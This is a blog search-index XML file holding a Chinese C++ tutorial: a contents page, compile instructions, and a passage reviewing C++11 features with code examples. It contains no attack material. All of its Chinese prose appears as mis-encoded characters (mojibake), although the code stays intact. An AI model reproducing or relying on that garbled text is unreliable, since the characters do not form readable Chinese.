<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++ Tutorial</title>
      <link href="2025/05/01/Cpp_tutorial_all/"/>
      <url>2025/05/01/Cpp_tutorial_all/</url>
      
        <content type="html"><![CDATA[<h1 id="C-Tutorial-ç›®å½•"><a href="#C-Tutorial-ç›®å½•" class="headerlink" title="C++ Tutorial ç›®å½•"></a>C++ Tutorial ç›®å½•</h1><ul><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_1/">Chapter 1 C++ Tutorial ç®€ä»‹</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_2/">Chapter 2 å¼€å§‹å­¦ä¹ C++</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_3/">Chapter 3 å¤„ç†æ•°æ®</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_4/">Chapter 4 å¤åˆç±»å‹</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_5/">Chapter 5 å¾ªç¯å’Œå…³ç³»è¡¨è¾¾å¼</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_6/">Chapter 6 åˆ†æ”¯è¯­å¥å’Œé€»è¾‘è¿ç®—ç¬¦</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_7/">Chapter 7 å‡½æ•°â€”â€”C++çš„ç¼–ç¨‹æ¨¡å—</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_8/">Chapter 8 å‡½æ•°è¿›é˜¶</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_9/">Chapter 9 å†…å­˜æ¨¡å‹å’Œåç§°ç©ºé—´</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_10/">Chapter 10 å¯¹è±¡å’Œç±»</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_11/">Chapter 11 ä½¿ç”¨ç±»</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_12/">Chapter 12 ç±»å’ŒåŠ¨æ€å†…å­˜åˆ†é…</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_13/">Chapter 13 ç±»ç»§æ‰¿</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_14/">Chapter 14 C++ä¸­çš„ä»£ç é‡ç”¨</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_15/">Chapter 15 å‹å…ƒã€å¼‚å¸¸å’Œå…¶ä»–</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_16/">Chapter 16 string ç±»å’Œæ ‡å‡†æ¨¡æ¿åº“</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_17/">Chapter 17 è¾“å…¥ã€è¾“å‡ºå’Œæ–‡ä»¶</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_18/">Chapter 18 æ¢è®¨C++æ–°æ ‡å‡†</a></li></ul><hr><p>æ–‡ç« æœªç»è®¸å¯ç¦æ­¢è½¬è½½ã€‚å¦‚æœ‰é—®é¢˜è¯·å‘é€é‚®ä»¶è‡³<code>xsran12138@163.com</code>ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 1 C++ Tutorial ç®€ä»‹</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_1/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_1/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç³»åˆ—æ˜¯å‚è€ƒã€ŠC++ Primer Plusã€‹ç›®å½•è¿›è¡Œç¼–å†™çš„ç²¾ç®€ç‰ˆæ•™ç¨‹ã€‚</p><p>ç”±äºæ˜¯ç²¾ç®€ç‰ˆï¼Œå› æ­¤å¯èƒ½ä¸èƒ½å®Œå…¨è¦†ç›–åŸç‰ˆã€ŠC++ Primer Plusã€‹çš„æ‰€æœ‰å†…å®¹ï¼Œä½†æ˜¯åœ¨ç¯‡å¹…ä¸Šå¤§å¤§å‡å°‘ï¼Œåªèƒ½è¯´æœ‰åˆ©æœ‰å¼Šå§ã€‚</p><p>å¯¹äºç¼–å†™ä»£ç çš„ç¯å¢ƒï¼Œä¸ªäººå»ºè®®æ˜¯ä½¿ç”¨wsl2ï¼ˆæ¨èï¼‰æˆ–è€…VMWareç­‰è™šæ‹Ÿæœºç¯å¢ƒä¸­Linuxè‡ªå¸¦çš„g++ç¼–è¯‘å™¨ï¼ˆä½¿ç”¨mingwç­‰ç¼–è¯‘å·¥å…·æœ‰å¯èƒ½ä¼šå‡ºç°å„ç§å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯ï¼‰ï¼Œå¸¸è§çš„ç¼–è¯‘å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåï¼Œæ‰§è¡Œå‘½ä»¤<code>./test</code>å³å¯è¿è¡Œç¼–è¯‘åçš„ç¨‹åºã€‚</p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥çœç•¥<code>-o test</code>ï¼Œç›´æ¥ä½¿ç”¨<code>g++ test.cpp</code>ç¼–è¯‘ï¼Œç¼–è¯‘å®Œæˆåä¼šç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶<code>a.out</code>ï¼Œæ‰§è¡Œå‘½ä»¤<code>./a.out</code>å³å¯è¿è¡Œç¼–è¯‘åçš„ç¨‹åºã€‚</p><hr><p>æ–‡ç« æœªç»è®¸å¯ç¦æ­¢è½¬è½½ã€‚å¦‚æœ‰é—®é¢˜è¯·å‘é€é‚®ä»¶è‡³<code>xsran12138@163.com</code>ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 18 æ¢è®¨C++æ–°æ ‡å‡†</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_18/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_18/</url>
      
        <content type="html"><![CDATA[<h2 id="18-1-å¤ä¹ å‰é¢ä»‹ç»è¿‡çš„C-11åŠŸèƒ½"><a href="#18-1-å¤ä¹ å‰é¢ä»‹ç»è¿‡çš„C-11åŠŸèƒ½" class="headerlink" title="18.1 å¤ä¹ å‰é¢ä»‹ç»è¿‡çš„C++11åŠŸèƒ½"></a>18.1 å¤ä¹ å‰é¢ä»‹ç»è¿‡çš„C++11åŠŸèƒ½</h2><p>C++11 æ ‡å‡†ä¸º C++ è¯­è¨€å¸¦æ¥äº†è®¸å¤šé‡è¦çš„æ”¹è¿›å’Œæ–°ç‰¹æ€§ï¼Œæ—¨åœ¨æé«˜è¯­è¨€çš„æ•ˆç‡ã€å®‰å…¨æ€§å’Œæ˜“ç”¨æ€§ã€‚åœ¨å‰é¢çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ¥è§¦å¹¶ä½¿ç”¨äº†å…¶ä¸­çš„ä¸€äº›åŠŸèƒ½ã€‚æœ¬èŠ‚å°†å¯¹è¿™äº›å·²ä»‹ç»çš„ C++11 ç‰¹æ€§è¿›è¡Œä¸€ä¸ªç®€è¦çš„å›é¡¾ã€‚</p><h3 id="18-1-1-æ–°ç±»å‹"><a href="#18-1-1-æ–°ç±»å‹" class="headerlink" title="18.1.1 æ–°ç±»å‹"></a>18.1.1 æ–°ç±»å‹</h3><p>C++11 å¼•å…¥äº†å‡ ç§æ–°çš„åŸºæœ¬ç±»å‹ï¼š</p><ul><li><strong><code>long long</code> å’Œ <code>unsigned long long</code>:</strong> ï¼ˆç¬¬ 3 ç« ï¼‰æä¾›äº†è‡³å°‘ 64 ä½çš„æ•´æ•°ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºæ¯” <code>long</code> æ›´å¤§èŒƒå›´çš„æ•´æ•°ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> large_num = <span class="number">9876543210123L</span>L;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> very_large_positive = <span class="number">18446744073709551615U</span>LL;</span><br></pre></td></tr></table></figure></li><li><strong><code>char16_t</code> å’Œ <code>char32_t</code>:</strong> ï¼ˆç¬¬ 3 ç« , ç¬¬ 16 ç« ï¼‰ç”¨äºæ˜¾å¼æ”¯æŒ UTF-16 å’Œ UTF-32 ç¼–ç çš„å­—ç¬¦ã€‚åˆ†åˆ«ä½¿ç”¨ <code>u</code> å’Œ <code>U</code> å‰ç¼€è¡¨ç¤ºå¯¹åº”çš„å­—ç¬¦å’Œå­—ç¬¦ä¸²å­—é¢é‡ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char16_t</span> utf16_char = <span class="string">u&#x27;Î©&#x27;</span>;</span><br><span class="line">char32_t utf32_char = U&#x27;ğŸŒ&#x27;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char16_t</span>* utf16_str = <span class="string">u&quot;ä½ å¥½&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char32_t</span>* utf32_str = <span class="string">U&quot;ä¸–ç•Œ&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><strong><code>nullptr</code>:</strong> ï¼ˆç¬¬ 4 ç« ï¼‰å¼•å…¥äº†æ–°çš„ç©ºæŒ‡é’ˆå¸¸é‡ <code>nullptr</code>ï¼Œç”¨äºæ›¿ä»£ä¹‹å‰ä½¿ç”¨çš„ <code>0</code> æˆ– <code>NULL</code>ã€‚<code>nullptr</code> å…·æœ‰æ˜ç¡®çš„æŒ‡é’ˆç±»å‹ (<code>std::nullptr_t</code>)ï¼Œå¯ä»¥é¿å…ä¸€äº›ä¸ <code>0</code> (æ•´æ•°) ç›¸å…³çš„æ­§ä¹‰ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* ptr1 = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span>) = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// if (ptr1 == 0) &#123; /* ... */ &#125; // æ—§å¼æ¯”è¾ƒ</span></span><br><span class="line"><span class="keyword">if</span> (ptr1 == <span class="literal">nullptr</span>) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// C++11 æ¨è</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-2-ç»Ÿä¸€çš„åˆå§‹åŒ–"><a href="#18-1-2-ç»Ÿä¸€çš„åˆå§‹åŒ–" class="headerlink" title="18.1.2 ç»Ÿä¸€çš„åˆå§‹åŒ–"></a>18.1.2 ç»Ÿä¸€çš„åˆå§‹åŒ–</h3><p>C++11 æ¨å¹¿äº†ä½¿ç”¨<strong>èŠ±æ‹¬å· <code>&#123;&#125;</code></strong> è¿›è¡Œåˆå§‹åŒ–çš„æ–¹å¼ï¼Œç§°ä¸º<strong>ç»Ÿä¸€åˆå§‹åŒ– (Uniform Initialization)</strong> æˆ–åˆ—è¡¨åˆå§‹åŒ– (List Initialization)ã€‚è¿™ç§æ–¹å¼å¯ä»¥ç”¨äºå¤šç§åˆå§‹åŒ–åœºæ™¯ï¼Œå¹¶æœ‰åŠ©äºé˜²æ­¢çª„åŒ–è½¬æ¢ (Narrowing Conversion)ã€‚</p><ul><li><strong>åŸºæœ¬ç±»å‹:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x&#123;<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> pi&#123;<span class="number">3.14</span>&#125;;</span><br><span class="line"><span class="comment">// int narrow_error&#123;3.14&#125;; // ç¼–è¯‘é”™è¯¯ï¼é˜²æ­¢ double åˆ° int çš„çª„åŒ–</span></span><br></pre></td></tr></table></figure></li><li><strong>æ•°ç»„:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;; <span class="comment">// å¤§å°è‡ªåŠ¨æ¨æ–­</span></span><br></pre></td></tr></table></figure></li><li><strong>ç»“æ„å’Œç±»:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span> <span class="keyword">int</span> x, y; &#125;;</span><br><span class="line">Point p&#123;<span class="number">10</span>, <span class="number">20</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s&#123;<span class="string">&quot;Hello&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>STL å®¹å™¨ (é€šè¿‡ <code>initializer_list</code>):</strong> ï¼ˆç¬¬ 16 ç« ï¼‰  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m &#123;&#123;<span class="string">&quot;one&quot;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&quot;two&quot;</span>, <span class="number">2</span>&#125;&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-3-å£°æ˜"><a href="#18-1-3-å£°æ˜" class="headerlink" title="18.1.3 å£°æ˜"></a>18.1.3 å£°æ˜</h3><p>C++11 å¼•å…¥äº†æ–°çš„å£°æ˜æ–¹å¼æ¥ç®€åŒ–ç±»å‹ä¹¦å†™å’Œæ¨æ–­ï¼š</p><ul><li><strong><code>auto</code>:</strong> ï¼ˆç¬¬ 3 ç« ï¼‰è®©ç¼–è¯‘å™¨æ ¹æ®å˜é‡çš„<strong>åˆå§‹åŒ–è¡¨è¾¾å¼</strong>è‡ªåŠ¨æ¨æ–­å…¶ç±»å‹ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> i = <span class="number">42</span>;        <span class="comment">// i æ¨æ–­ä¸º int</span></span><br><span class="line"><span class="keyword">auto</span> d = <span class="number">3.14</span>;      <span class="comment">// d æ¨æ–­ä¸º double</span></span><br><span class="line"><span class="keyword">auto</span> s = <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;text&quot;</span>); <span class="comment">// s æ¨æ–­ä¸º std::string</span></span><br><span class="line"><span class="keyword">auto</span> it = v.begin(); <span class="comment">// it æ¨æ–­ä¸º std::vector&lt;int&gt;::iterator</span></span><br></pre></td></tr></table></figure></li><li><strong><code>decltype</code>:</strong> æ ¹æ®<strong>è¡¨è¾¾å¼</strong>æ¨æ–­ç±»å‹ï¼Œä½†ä¸è®¡ç®—è¯¥è¡¨è¾¾å¼ã€‚å¸¸ç”¨äºæ³›å‹ç¼–ç¨‹æˆ–éœ€è¦æ ¹æ®å·²æœ‰å˜é‡æˆ–å‡½æ•°è¿”å›å€¼ç¡®å®šç±»å‹çš„åœºæ™¯ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">decltype</span>(x) y = <span class="number">10</span>; <span class="comment">// y çš„ç±»å‹ä¸ x ç›¸åŒï¼Œä¸º int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">func</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">decltype</span>(func()) z; <span class="comment">// z çš„ç±»å‹æ˜¯ func çš„è¿”å›ç±»å‹ double (ä¸å®é™…è°ƒç”¨ func)</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-4-æ™ºèƒ½æŒ‡é’ˆ"><a href="#18-1-4-æ™ºèƒ½æŒ‡é’ˆ" class="headerlink" title="18.1.4 æ™ºèƒ½æŒ‡é’ˆ"></a>18.1.4 æ™ºèƒ½æŒ‡é’ˆ</h3><p>ï¼ˆç¬¬ 16 ç« ï¼‰C++11 åœ¨ <code>&lt;memory&gt;</code> å¤´æ–‡ä»¶ä¸­å¼•å…¥äº†ç°ä»£æ™ºèƒ½æŒ‡é’ˆï¼Œç”¨äºè‡ªåŠ¨ç®¡ç†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå–ä»£äº†å®¹æ˜“å‡ºé”™çš„ <code>auto_ptr</code>ã€‚</p><ul><li>  <strong><code>std::unique_ptr&lt;T&gt;</code>:</strong> ç‹¬å æ‰€æœ‰æƒçš„æ™ºèƒ½æŒ‡é’ˆï¼Œè½»é‡çº§ï¼Œä¸å¯å¤åˆ¶ï¼Œå¯ç§»åŠ¨ã€‚</li><li>  <strong><code>std::shared_ptr&lt;T&gt;</code>:</strong> å…±äº«æ‰€æœ‰æƒçš„æ™ºèƒ½æŒ‡é’ˆï¼Œé€šè¿‡å¼•ç”¨è®¡æ•°ç®¡ç†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸã€‚</li><li>  <strong><code>std::weak_ptr&lt;T&gt;</code>:</strong> éæ‹¥æœ‰å‹æŒ‡é’ˆï¼Œç”¨äºè§‚å¯Ÿ <code>shared_ptr</code> ç®¡ç†çš„å¯¹è±¡ï¼Œè§£å†³å¾ªç¯å¼•ç”¨é—®é¢˜ã€‚</li></ul><h3 id="18-1-5-å¼‚å¸¸è§„èŒƒæ–¹é¢çš„ä¿®æ”¹"><a href="#18-1-5-å¼‚å¸¸è§„èŒƒæ–¹é¢çš„ä¿®æ”¹" class="headerlink" title="18.1.5 å¼‚å¸¸è§„èŒƒæ–¹é¢çš„ä¿®æ”¹"></a>18.1.5 å¼‚å¸¸è§„èŒƒæ–¹é¢çš„ä¿®æ”¹</h3><p>ï¼ˆç¬¬ 15 ç« ï¼‰C++11 å¼•å…¥äº† <code>noexcept</code> è¯´æ˜ç¬¦å’Œè¿ç®—ç¬¦ï¼Œç”¨äºæŒ‡ç¤ºå‡½æ•°æ˜¯å¦å¯èƒ½æŠ›å‡ºå¼‚å¸¸ã€‚</p><ul><li><strong><code>noexcept</code> è¯´æ˜ç¬¦:</strong> æ”¾åœ¨å‡½æ•°å£°æ˜æˆ–å®šä¹‰åï¼Œè¡¨ç¤ºè¯¥å‡½æ•°ä¿è¯ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">()</span> <span class="keyword">noexcept</span></span>; <span class="comment">// å£°æ˜ä¿è¯ä¸æŠ›å¼‚å¸¸</span></span><br></pre></td></tr></table></figure>  è¿™æœ‰åŠ©äºç¼–è¯‘å™¨è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶ç”¨äºå¼‚å¸¸å®‰å…¨ä¿è¯ã€‚ææ„å‡½æ•°é»˜è®¤æ˜¯ <code>noexcept</code> çš„ã€‚</li><li>  <strong><code>noexcept</code> è¿ç®—ç¬¦:</strong> <code>noexcept(expression)</code>ï¼Œåœ¨ç¼–è¯‘æ—¶åˆ¤æ–­è¡¨è¾¾å¼ <code>expression</code> æ˜¯å¦å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›ä¸€ä¸ª <code>bool</code> å¸¸é‡ã€‚</li></ul><p>æ—§çš„ <code>throw()</code> å¼‚å¸¸è§„èŒƒåœ¨ C++11 ä¸­è¢«åºŸå¼ƒã€‚</p><h3 id="18-1-6-ä½œç”¨åŸŸå†…æšä¸¾"><a href="#18-1-6-ä½œç”¨åŸŸå†…æšä¸¾" class="headerlink" title="18.1.6 ä½œç”¨åŸŸå†…æšä¸¾"></a>18.1.6 ä½œç”¨åŸŸå†…æšä¸¾</h3><p>ï¼ˆç¬¬ 10 ç« ï¼‰C++11 å¼•å…¥äº†<strong>å¼ºç±»å‹æšä¸¾ (Strongly-typed enums)</strong> æˆ–**ä½œç”¨åŸŸå†…æšä¸¾ (Scoped enums)**ï¼Œä½¿ç”¨ <code>enum class</code> (æˆ– <code>enum struct</code>) å…³é”®å­—å®šä¹‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span> &#123;</span> RED, GREEN, BLUE &#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Status</span> &#123;</span> OK, ERROR &#125;;</span><br><span class="line"></span><br><span class="line">Color c = Color::RED;</span><br><span class="line">Status s = Status::OK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if (c == s) &#123;&#125; // ç¼–è¯‘é”™è¯¯ï¼ä¸åŒç±»å‹çš„æšä¸¾ä¸èƒ½ç›´æ¥æ¯”è¾ƒ</span></span><br><span class="line"><span class="comment">// int x = c;     // ç¼–è¯‘é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ä¸ºæ•´æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c == Color::GREEN) &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>å¼ºç±»å‹:</strong> ä¸åŒæšä¸¾ç±»å‹çš„å€¼ä¸èƒ½éšå¼è½¬æ¢æˆ–ç›´æ¥æ¯”è¾ƒã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> æšä¸¾æˆå‘˜çš„ä½œç”¨åŸŸé™å®šåœ¨æšä¸¾ç±»å‹å†…éƒ¨ï¼Œå¿…é¡»é€šè¿‡ <code>EnumType::Member</code> è®¿é—®ï¼Œé¿å…äº†å‘½åå†²çªã€‚</li><li>  <strong>å¯æŒ‡å®šåº•å±‚ç±»å‹:</strong> <code>enum class Color : char &#123; RED, GREEN, BLUE &#125;;</code></li></ul><h3 id="18-1-7-å¯¹ç±»çš„ä¿®æ”¹"><a href="#18-1-7-å¯¹ç±»çš„ä¿®æ”¹" class="headerlink" title="18.1.7 å¯¹ç±»çš„ä¿®æ”¹"></a>18.1.7 å¯¹ç±»çš„ä¿®æ”¹</h3><p>(æœ¬èŠ‚ä¸»è¦å›é¡¾ï¼Œä½†éƒ¨åˆ†å†…å®¹å¦‚å§”æ‰˜/ç»§æ‰¿æ„é€ å‡½æ•°ã€override/final åœ¨ 18.3 è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œä»…æåŠæ¦‚å¿µ)<br>C++11 å¯¹ç±»å®šä¹‰å’Œä½¿ç”¨ä¹Ÿè¿›è¡Œäº†ä¸€äº›æ”¹è¿›ï¼Œéƒ¨åˆ†å·²åœ¨å‰é¢ç« èŠ‚æ¶‰åŠæˆ–å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†ä»‹ç»ï¼Œä¾‹å¦‚ï¼š</p><ul><li>  <strong>é»˜è®¤æ„é€ å‡½æ•°å’Œæˆå‘˜åˆå§‹åŒ–:</strong> å…è®¸åœ¨ç±»å®šä¹‰ä¸­ç›´æ¥åˆå§‹åŒ–éé™æ€æˆå‘˜å˜é‡ã€‚</li><li>  <strong><code>= default</code> å’Œ <code>= delete</code>:</strong> æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆæ„é€ ã€ææ„ã€æ‹·è´ã€ç§»åŠ¨ï¼‰æˆ–ç¦ç”¨å®ƒä»¬ã€‚</li><li>  <strong>å§”æ‰˜æ„é€ å‡½æ•°:</strong> ä¸€ä¸ªæ„é€ å‡½æ•°å¯ä»¥è°ƒç”¨åŒä¸€ç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ã€‚</li><li>  <strong>ç»§æ‰¿æ„é€ å‡½æ•°:</strong> æ´¾ç”Ÿç±»å¯ä»¥ç»§æ‰¿åŸºç±»çš„æ„é€ å‡½æ•°ã€‚</li><li>  <strong><code>override</code> å’Œ <code>final</code>:</strong> ç”¨äºç®¡ç†è™šå‡½æ•°ï¼Œ<code>override</code> ç¡®ä¿æ´¾ç”Ÿç±»æ–¹æ³•ç¡®å®è¦†ç›–äº†åŸºç±»è™šå‡½æ•°ï¼Œ<code>final</code> é˜»æ­¢æ´¾ç”Ÿç±»è¿›ä¸€æ­¥è¦†ç›–è™šå‡½æ•°æˆ–é˜»æ­¢ç±»è¢«ç»§æ‰¿ã€‚</li></ul><h3 id="18-1-8-æ¨¡æ¿å’Œ-STL-æ–¹é¢çš„ä¿®æ”¹"><a href="#18-1-8-æ¨¡æ¿å’Œ-STL-æ–¹é¢çš„ä¿®æ”¹" class="headerlink" title="18.1.8 æ¨¡æ¿å’Œ STL æ–¹é¢çš„ä¿®æ”¹"></a>18.1.8 æ¨¡æ¿å’Œ STL æ–¹é¢çš„ä¿®æ”¹</h3><p>C++11 å¯¹æ¨¡æ¿å’Œæ ‡å‡†åº“è¿›è¡Œäº†å¤§é‡å¢å¼ºï¼š</p><ul><li><strong>åŸºäºèŒƒå›´çš„ <code>for</code> å¾ªç¯:</strong> ï¼ˆç¬¬ 5 ç« , ç¬¬ 16 ç« ï¼‰æä¾›äº†ç®€æ´çš„éå†å®¹å™¨æˆ–åºåˆ—çš„æ–¹å¼ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> x : v) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong><code>std::array</code>:</strong> ï¼ˆç¬¬ 4 ç« , ç¬¬ 16 ç« ï¼‰æä¾›äº†å›ºå®šå¤§å°æ•°ç»„çš„æ¨¡æ¿ç±»å°è£…ã€‚</li><li>  <strong>æ— åºå…³è”å®¹å™¨:</strong> ï¼ˆç¬¬ 16 ç« ï¼‰å¼•å…¥äº†åŸºäºå“ˆå¸Œè¡¨çš„ <code>unordered_set</code>, <code>unordered_map</code>, <code>unordered_multiset</code>, <code>unordered_multimap</code>ã€‚</li><li>  <strong><code>std::initializer_list</code>:</strong> ï¼ˆç¬¬ 16 ç« ï¼‰ä½¿å¾—å®¹å™¨å’Œå…¶ä»–ç±»èƒ½å¤Ÿæ”¯æŒä½¿ç”¨ <code>&#123;&#125;</code> è¿›è¡Œåˆ—è¡¨åˆå§‹åŒ–ã€‚</li><li>  <strong>æ–°çš„ STL ç®—æ³•:</strong> å¢åŠ äº†ä¸€äº›æ–°çš„ç®—æ³•ï¼ˆå¦‚ <code>copy_if</code>, <code>move</code>, <code>shuffle</code> ç­‰ï¼‰ã€‚</li><li>  <strong>Lambda è¡¨è¾¾å¼:</strong> ï¼ˆç¬¬ 16 ç« ç®€å•ä½¿ç”¨ï¼Œç¬¬ 18.4 èŠ‚è¯¦ç»†ä»‹ç»ï¼‰å…è®¸å°±åœ°å®šä¹‰åŒ¿åå‡½æ•°å¯¹è±¡ã€‚</li><li><strong>æ¨¡æ¿åˆ«å (<code>using</code>):</strong> ï¼ˆç¬¬ 14 ç« ï¼‰æä¾›äº†æ¯” <code>typedef</code> æ›´æ¸…æ™°ã€æ›´å¼ºå¤§çš„ä¸ºæ¨¡æ¿å®šä¹‰åˆ«åçš„æ–¹å¼ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 